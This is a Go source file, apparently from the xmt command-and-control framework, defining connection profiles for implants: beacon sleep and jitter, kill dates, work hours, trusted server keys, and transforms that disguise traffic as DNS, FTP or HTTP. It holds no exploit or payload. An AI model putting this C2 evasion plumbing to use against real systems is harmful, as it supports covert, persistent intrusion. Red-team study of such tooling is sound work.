// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cfg

import (
	"context"
	"io"
	"net"
	"time"

	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// DefaultSleep is the default sleep Time when the provided sleep value is
// empty or negative.
const DefaultSleep = time.Duration(60) * time.Second

// DefaultJitter is the default Jitter value when the provided jitter value
// is negative.
const DefaultJitter uint8 = 10

var (
	// ErrNotAListener is an error that can be returned by a call to a Profile's
	// 'Listen' function when that operation is disabled.
	ErrNotAListener = xerr.Sub("not a Listener", 0x47)
	// ErrNotAConnector is an error that can be returned by a call to a
	// Profile's 'Connect' function when that operation is disabled.
	ErrNotAConnector = xerr.Sub("not a Connector", 0x48)
)

// Static is a simple static Profile implementation.
//
// This struct fills all the simple values for a Profile without anything
// Fancy.
//
// The single letter attributes represent the values that are used.
//
// If 'S' or 'J' are omitted or zero values, they will be replaced with the
// DefaultJitter and DefaultSleep values respectively.
//
// If the 'L' or 'C' values are omitted or nil, they will disable that function
// of this Profile.
type Static struct {
	_ [0]func()
	// W is the Wrapper
	W Wrapper
	// T is the Transform
	T Transform
	// L is the Acceptor or Server Listener Connector
	L Accepter
	// C is the Connector or Client Connector
	C Connector
	// K is the KillDate
	K *time.Time
	// A is the WorHours
	A *WorkHours
	// H is the Target Host or Listen Address
	H string
	// P is the valid Server PublicKeys that can be used as FNV-32 hashes
	P []uint32
	// S is the Sleep duration
	S time.Duration
	// J is the Jitter percentage
	J int8
}

// Profile is an interface that defines a C2 connection.
//
// This is used for setting the specifics that wil be used to listen by servers
// and for connections by clients.
type Profile interface {
	Jitter() int8
	Switch(bool) bool
	Sleep() time.Duration
	WorkHours() *WorkHours
	KillDate() (time.Time, bool)
	TrustedKey(data.PublicKey) bool
	Next() (string, Wrapper, Transform)
	Connect(context.Context, string) (net.Conn, error)
	Listen(context.Context, string) (net.Listener, error)
}

// Wrapper is an interface that wraps the binary streams into separate stream
// types. This allows for using encryption or compression (or both!).
type Wrapper interface {
	Unwrap(io.Reader) (io.Reader, error)
	Wrap(io.WriteCloser) (io.WriteCloser, error)
}
type stackCloser struct {
	_ [0]func()
	s io.WriteCloser
	io.WriteCloser
}

// Accepter is an interface that can be used to create listening sockets.
//
// This interface defines a single function that returns a listener based on an
// accept address string.
//
// The supplied Context can be used to close the listening socket.
type Accepter interface {
	Listen(context.Context, string) (net.Listener, error)
}

// Connector is an interface that can be used to connect to listening sockets.
//
// This interface defines a single function that returns a Connected socket
// based on the connection string.
//
// The supplied Context can be used to close the connecting socket or interrupt
// blocking connections.
type Connector interface {
	Connect(context.Context, string) (net.Conn, error)
}

// Transform is an interface that can modify the data BEFORE it is written or
// AFTER is read from a Connection.
//
// Transforms may be used to mask and unmask communications as benign protocols
// such as DNS, FTP or HTTP.
type Transform interface {
	Read([]byte, io.Writer) error
	Write([]byte, io.Writer) error
}

// MultiWrapper is an alias for an array of Wrappers.
//
// This will preform the wrapper/unwrapping operations in the order of the
// array.
//
// This is automatically created by some Profile instances when multiple
// Wrappers are present.
type MultiWrapper []Wrapper

// Jitter fulfils the Profile interface.
func (s Static) Jitter() int8 {
	if s.J < 0 || s.J > 100 {
		return int8(DefaultJitter)
	}
	return s.J
}

// Switch is function that will indicate to the caller if the 'Next' function
// needs to be called. Calling this function has the potential to advance the
// Profile group, if available.
//
// The supplied boolean must be true if the last call to 'Connect' ot 'Listen'
// resulted in an error or if a forced switch if warranted.
// This indicates to the Profile is "dirty" and a switchover must be done.
//
// It is recommended to call the 'Next' function after if the result of this
// function is true.
//
// Static Profile variants may always return 'false' to prevent allocations.
func (Static) Switch(_ bool) bool {
	return false
}
func (s *stackCloser) Close() error {
	if err := s.WriteCloser.Close(); err != nil {
		return err
	}
	return s.s.Close()
}

// Sleep returns a value that indicates the amount of time a Session should wait
// before attempting communication again, modified by Jitter (if enabled).
//
// Sleep MUST be greater than zero (0), any value that is zero or less is
// ignored and indicates that this profile does not set a Sleep value and will
// use the system default '60s'.
func (s Static) Sleep() time.Duration {
	if s.S <= 0 {
		return DefaultSleep
	}
	return s.S
}

// WorkHours fulfils the Profile interface. Empty WorkHours values indicate that
// there is no workhours set and a nil value indicates that there is no WorkHours
// in this Profile.
func (s Static) WorkHours() *WorkHours {
	return s.A
}

// KillDate fulfils the Profile interface.
//
// A valid or empty time.Time value along with a True will indicate that this
// Profile has a KillDate set. If the boolean is false, this indicates that no
// KilDate is specified in this Profile and the 'time.Time' will be ignored.
func (s Static) KillDate() (time.Time, bool) {
	if s.K == nil {
		return time.Time{}, false
	}
	return *s.K, true
}

// TrustedKey returns true if the supplied Server PublicKey is trusted.
// Empty PublicKeys will always return false.
//
// This function returns true if no trusted PublicKey hashes are configured or
// the hash was found.
func (s Static) TrustedKey(k data.PublicKey) bool {
	if k.Empty() {
		return false
	}
	if len(s.P) == 0 {
		return true
	}
	h := k.Hash()
	for i := range s.P {
		if s.P[i] == h {
			return true
		}
	}
	return false
}

// Next is a function call that can be used to grab the Profile's current target
// along with the appropriate Wrapper and Transform.
//
// Implementations of a Profile are recommend to ensure that this function does
// not affect how the Profile currently works until a call to 'Switch' as this
// WILL be called on startup of a Session.
func (s Static) Next() (string, Wrapper, Transform) {
	return s.H, s.W, s.T
}

// Unwrap satisfies the Wrapper interface.
func (m MultiWrapper) Unwrap(r io.Reader) (io.Reader, error) {
	var (
		o   = r
		err error
	)
	for x := len(m) - 1; x >= 0; x-- {
		if o, err = m[x].Unwrap(o); err != nil {
			return nil, err
		}
	}
	return o, nil
}

// Wrap satisfies the Wrapper interface.
func (m MultiWrapper) Wrap(w io.WriteCloser) (io.WriteCloser, error) {
	var (
		o   = w
		k   io.WriteCloser
		err error
	)
	for x := len(m) - 1; x >= 0; x-- {
		if k, err = m[x].Wrap(o); err != nil {
			return nil, err
		}
		o = &stackCloser{s: o, WriteCloser: k}
	}
	return o, nil
}

// Connect is a function that will preform a Connection attempt against the
// supplied address string.
//
// This function may return an error if a connection could not be made or if
// this Profile does not support Client-side connections.
//
// It is recommended for implementations to implement using the passed Context
// to stop in-flight calls.
func (s Static) Connect(x context.Context, a string) (net.Conn, error) {
	if s.C == nil {
		return nil, ErrNotAConnector
	}
	return s.C.Connect(x, a)
}

// Listen is a function that will attempt to create a listening connection on
// the supplied address string.
//
// This function may return an error if a listener could not be created or if
// this Profile does not support Server-side connections.
//
// It is recommended for implementations to implement using the passed Context
// to stop running Listeners.
func (s Static) Listen(x context.Context, a string) (net.Listener, error) {
	if s.L == nil {
		return nil, ErrNotAListener
	}
	return s.L.Listen(x, a)
}
